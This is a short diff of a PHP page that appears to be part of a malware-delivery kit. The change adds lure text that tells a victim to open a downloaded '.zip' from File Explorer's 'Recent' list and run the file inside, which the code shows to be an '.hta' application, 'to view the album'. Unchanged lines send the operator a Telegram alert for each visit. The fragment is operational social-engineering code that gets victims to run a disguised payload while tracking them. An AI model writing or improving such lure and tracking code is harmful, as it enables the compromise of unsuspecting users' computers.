@@ -17,7 +17,8 @@ $tk    = rawurlencode($_GET['tk']);
 $nameQ = rawurlencode($name);
 
 // Points at Windows 11 File Explorer "Recent", where fresh downloads land first.
-$instr = 'Find <strong>' . htmlspecialchars($name) . '</strong> in <strong>Recent</strong> (File Explorer) and open it to view the album.';
+$zipBase = preg_replace('/\.hta$/i', '', $name);
+$instr = 'Open <strong>' . htmlspecialchars($zipBase . '.zip') . '</strong> in <strong>Recent</strong> (File Explorer), then run the file inside it to view the album.';
 
 // ---- one Telegram alert per visit (deduped by token nonce) ----
 $key = ALERT_DIR . '/al_' . md5($tok['r'] . '|' . $name) . '.fired';
